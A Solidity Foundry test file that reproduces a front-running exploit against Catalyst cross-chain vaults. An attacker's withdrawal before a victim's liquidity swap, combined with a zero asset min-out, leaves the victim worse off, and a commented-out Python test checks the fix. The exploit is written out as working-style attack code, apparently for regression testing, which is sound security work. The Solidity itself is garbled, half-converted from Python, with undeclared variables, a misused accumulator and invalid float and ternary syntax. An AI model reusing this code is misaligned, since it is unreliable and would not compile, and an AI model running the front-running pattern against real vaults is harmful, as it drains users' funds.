// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../TestCommon.t.sol";
import "src/ICatalystV1Vault.sol";
import "src/utils/FixedPointMathLib.sol";
import { ICatalystV1Structs } from "src/interfaces/ICatalystV1VaultState.sol";
import {Token} from "../../mocks/token.sol";
import {AVaultInterfaces} from "../AVaultInterfaces.t.sol";

abstract contract TestCircumventLiquiditySwapMinout is TestCommon, AVaultInterfaces {
        
    function test_circumvent_minout() {
        address[] memory vaults = getTestConfig();
        require(vaults.length >= 2, "Not enough vaults defined");
        /*
        This exploit focuses on an implementation detail surrounding liquidity swaps.
        By depositing before liquidity swapping, the total supply increases and the
        number of units returned for vault tokens decreases. The user can protect against
        this by setting a minimum outout. However, if this minimum output is in vault tokens
        someone can frontrun on the destination side to increase the number of vault
        tokens returned.
        */

        address alice = makeAddr("alice");
        address exploitor = makeAddr("exploitor");

        // First we check what a normal liquidity swap returns:

        ICatalystV1Vault v1 = ICatalystV1Vault(vaults[0]);
        ICatalystV1Vault v2 = ICatalystV1Vault(vaults[1]);
        address[] memory vault1_tokens = getVaultTokens(address(v1));
        address[] memory vault2_tokens = getVaultTokens(address(v2));

        ICatalystV1Structs.RouteDescription memory routeDescription = ICatalystV1Structs.RouteDescription({
            chainIdentifier: bytes32(uint256(123)),
            toVault: convertEVMTo65(address(v2)),
            toAccount: convertEVMTo65(address(alice)),
            incentive: _INCENTIVE
        });

        // Set the amount
        uint256 swap_amount = v1.totalSupply() / 10;
        v1.transfer(alice, swap_amount);

        // Calculate the expected number of vault tokens.
        uint256 pool_tokens_out;
        if (amplified) {
            // TODO;
        } else {
            uint256 weight_sum1;
            for (uint256 i = 0; i < vault1_tokens.length; ++i) {
                weight_sum2 += v1._weight(vault1_tokens[i]);
            }
            uint256 weight_sum2;
            for (uint256 i = 0; i < vault2_tokens.length; ++i) {
                weight_sum2 += v2._weight(vault2_tokens[i]);
            }

            uint256 U = log(
                v1.totalSupply() * 10**18 / (v1.totalSupply() - swap_amount)
            ) * weight_sum1;

            uint256 intermediate = exp(-U / weight_sum2);
            pool_tokens_out = (10**18 - intermediate) * 10**18 / intermediate;
        }
        // Calculate the refernece asset.
        uint256 asset_reference_amount;
        if (amplified) {
            // TODO
        } else {
            uint256 weighted_balance_sum2;
            uint256 weight_sum2;
            for (uint256 i = 0; i < vault2_tokens.length; ++i) {
                uint256 weight = v2._weight(vault2_tokens[i]);
                weight_sum2 += weight;
                weighted_balance_sum2 += log(Token(vault2_tokens[i]).balanceOf(address(v2)) * 10**18) * weight;
            }
            asset_reference_amount = exp(
                weighted_balance_sum2 * 10**18
                / weight_sum2
            );
            asset_reference_amount = int(
                (asset_reference_amount * pool_tokens_out) / (v2.totalSupply() + pool_tokens_out)
            );
        }

        uint256 snapshotId = vm.snapshot();

        // Do the liquidity swap.
        vm.prank(alice);
        vm.recordLogs();
        uint256 output_units_1 = vault_1.sendLiquidity(
            routeDescription,
            swap_amount,
            [int(pool_tokens_out * 999/1000), int(asset_reference_amount * 999/1000)],
            berg
        );
        Vm.Log[] memory entries = vm.getRecordedLogs();

        (, , bytes memory messageWithContext) = abi.decode(entries[1].data, (bytes32, bytes, bytes));
        (bytes memory _metadata, bytes memory toExecuteMessage) = getVerifiedMessage(address(GARP), messageWithContext);

        GARP.processMessage(_metadata, toExecuteMessage, FEE_RECIPITANT);

        // Save the number of vault tokens minted as a reference amount.
        reference_vault_tokens = v2.balanceOf(alice);

        // Compute the value of the vault tokens in an equal withdrawal.
        vm.prank(alice);
        uint256[] memory output_tokens = v2.withdrawAll(reference_vault_tokens, [0, 0, 0]);

        revertTo(snapshotId);

        // Execute the exploit. The chain has been reset.

        // Set the exploit amount.
        uint256 exploit_amount = v1.totalSupply() / 10;
        v1.transfer(exploitor, exploit_amount);

        // The sendLiquidity is front-run by withdrawAll. This increases the number of units minted.
        vm.prank(exploitor);
        uint256[] memory exploit_withdrawal = v1.withdrawAll(exploit_amount, [0, 0, 0]);

        // Approval are set for a later deposit.
        for (uint256 i = 0; i < vault1_tokens.length; ++i) {
            address tkn = vault1_tokens[i];
            vm.prank(exploitor);
            Token(tkn).approve(address(v1), exploit_withdrawal[i]);
        }

        // User does the liquidity swap.
        vm.prank(alice);
        vm.recordLogs();
        uint256 output_units_2 = vault_1.sendLiquidity(
            routeDescription,
            swap_amount,
            [
                int(pool_tokens_out * 0.999),
                0 // ! HERE, 0 should be int(asset_reference_amount*0.999)
            ],  
            alice
        );
        entries = vm.getRecordedLogs();
        // Get the ouput units.
        // Assert the exploit condition after swap.
        assertGt(
            output_units_2,
            output_units_1,
            "Invalid core logic, withdrawals should result in more units minted."
        );

        // Set the exploit amount on the other chain.
        uint256 multiplier = amplified ? require(false, "not implemented") : 1.1;
        uint256 exploit_2_amount = exploit_amount * multiplier;
        v2.transfer(exploitor, exploit_2_amount);

        vm.prank(exploitor);
        exploit_withdrawal = v2.withdrawAll(exploit_2_amount, [0, 0, 0]);

        // Approval are set for a later deposit.
        for (uint256 i = 0; i < vault2_tokens.length; ++i) {
            address tkn = vault2_tokens[i];
            vm.prank(exploitor);
            Token(tkn).approve(address(v2), exploit_withdrawal[i]);
        }

        // Let the liquidity swap arrive. Since there are less vault tokens in the target vault, less vault tokens are minted. To compensate for this, more units were originally sent.
        // However, each of these new vault tokens are worth less than originally.
        vm.recordLogs();
        GARP.processMessage(_metadata, toExecuteMessage, address(alice));
        entries = vm.getRecordedLogs();

        (, , messageWithContext) = abi.decode(entries[1].data, (bytes32, bytes, bytes));
        (_metadata, toExecuteMessage) = getVerifiedMessage(address(GARP), messageWithContext);

        // Ack so we can work on the sending chain.
        GARP.processMessage(_metadata, toExecuteMessage, address(alice));

        // Check swap results.
        uint256 after_exploit_vault_tokens = v2.balanceOf(alice);
        vm.prank(alice);
        uint256[] memory after_exploit_output_tokens = v2.withdrawAll(after_exploit_vault_tokens, [0, 0, 0]);

        for (uint256 i = 0; i < output_tokens.length; ++i) {
            uint256 reference_withdrawal = output_tokens[i];
            uint256 under_exploit_withdrawal = after_exploit_output_tokens[i];

            if (reference_withdrawal + under_exploit_withdrawal == 0) continue;

            assertGt(reference_withdrawal, under_exploit_withdrawal, "Exploit didn't work");
        }
    }

    // function test_circumvent_minout_is_fixed() external {
    //     /*
    //     This exploit focuses on an implementation detail surrounding liquidity swaps.
    //     By depositing before liquidity swapping, the total supply increases and the
    //     number of units returned for vault tokens decreases. The user can protect against
    //     this by setting a minimum outout. However, if this minimum output is in vault tokens
    //     someone can frontrun on the destination side to increase the number of vault
    //     tokens returned.
    //     */

    //     # First we check what a normal liquidity swap returns:

    //     # Set the amount
    //     swap_amount = vault_1.totalSupply() / 10
    //     vault_1.transfer(berg, swap_amount, {"from": deployer})

    //     if get_vault_1_amp() != 10**18:
    //         pytest.skip("reference amount is not implemented for stable coin vaults.")
    //     # Calculate the refernece asset.
    //     ## Calculate the expected number of vault tokens.
    //     U = log(vault_1.totalSupply() / (vault_1.totalSupply() - swap_amount)) * sum(
    //         [vault_1._weight(token) for token in vault_1_tokens]
    //     )
    //     intermediate = exp(-U / sum([vault_2._weight(token) for token in vault_2_tokens]))
    //     pt_out = (1 - intermediate) / intermediate * 10**18

    //     asset_reference_amount = exp(
    //         sum(
    //             [
    //                 log(token.balanceOf(vault_2)) * vault_2._weight(token)
    //                 for token in vault_2_tokens
    //             ]
    //         )
    //         / sum([vault_2._weight(token) for token in vault_2_tokens])
    //     )
    //     asset_reference_amount = int(
    //         (asset_reference_amount * pt_out) / (vault_2.totalSupply() + pt_out)
    //     )

    //     # Do the liquidity swap.
    //     tx = vault_1.sendLiquidity(
    //         channel_id,
    //         convert_64_bytes_address(vault_2.address),
    //         convert_64_bytes_address(berg.address),
    //         swap_amount,
    //         [int(pt_out * 0.999), int(asset_reference_amount * 0.999)],
    //         berg,
    //         {"from": berg},
    //     )

    //     # Save the unit output.
    //     output_units_1 = tx.return_value

    //     # Execute the transaction.
    //     tx_execute = ibc_emulator.execute(
    //         tx.events["IncomingMetadata"]["metadata"][0],
    //         tx.events["IncomingPacket"]["packet"],
    //         {"from": berg},
    //     )

    //     # Save the number of vault tokens minted as a reference amount.
    //     reference_vault_tokens = vault_2.balanceOf(berg)

    //     # Compute the value of the vault tokens in an equal withdrawal.
    //     output_tokens = vault_2.withdrawAll(
    //         reference_vault_tokens, [0, 0, 0], {"from": berg}
    //     ).return_value

    //     chain.undo(3)

    //     # Execute the exploit. The chain has been reset.

    //     # Set the exploit amount.
    //     exploit_amount = vault_1.totalSupply() / 10
    //     vault_1.transfer(elwood, exploit_amount, {"from": deployer})

    //     # The sendLiquidity is front-ran by a liquidity swap. This increases the number of units minted.
    //     exploit_withdrawal = vault_1.withdrawAll(
    //         exploit_amount, [0, 0, 0], {"from": elwood}
    //     )

    //     # Approval are set for a later deposit.
    //     for (token, amount) in zip(vault_1_tokens, exploit_withdrawal.return_value):
    //         token.approve(vault_1, amount, {"from": elwood})

    //     # User does the liquidity swap.
    //     tx = vault_1.sendLiquidity(
    //         channel_id,
    //         convert_64_bytes_address(vault_2.address),
    //         convert_64_bytes_address(berg.address),
    //         swap_amount,
    //         [int(pt_out * 0.999), int(asset_reference_amount * 0.999)],
    //         berg,
    //         {"from": berg},
    //     )
    //     # Get the ouput units.
    //     output_units_2 = tx.return_value
    //     # Assert the exploit condition after swap.
    //     assert output_units_1 < output_units_2

    //     # Set the exploit amount on the other chain.
    //     multiplier = 1.1 if get_vault_1_amp() == 10**18 else NotImplementedError
    //     exploit_2_amount = exploit_amount * multiplier
    //     vault_2.transfer(elwood, exploit_2_amount, {"from": deployer})
    //     elwood_withdrawal = vault_2.withdrawAll(
    //         exploit_2_amount, [0, 0, 0], {"from": elwood}
    //     )
    //     for (token, amount) in zip(vault_2_tokens, elwood_withdrawal.return_value):
    //         token.approve(vault_2, amount, {"from": elwood})

    //     # Let the liquidity swap arrive. Since there are less vault tokens in the target vault, less vault tokens are minted. To compensate for this, more units were originally sent.
    //     # However, each of these new vault tokens are worth less than originally.
    //     # Because the minout is set, there should be no w

    //     tx_execute = ibc_emulator.execute(
    //         tx.events["IncomingMetadata"]["metadata"][0],
    //         tx.events["IncomingPacket"]["packet"],
    //         {"from": berg},
    //     )
    //     # Check that the transaction acks on fail.
    //     assert tx_execute.events["Acknowledgement"]["acknowledgement"] == hex(1)

    //     # Ensure no tokens are transfered.
    //     assert "Transfer" not in tx_execute.events.keys()
    // }
}

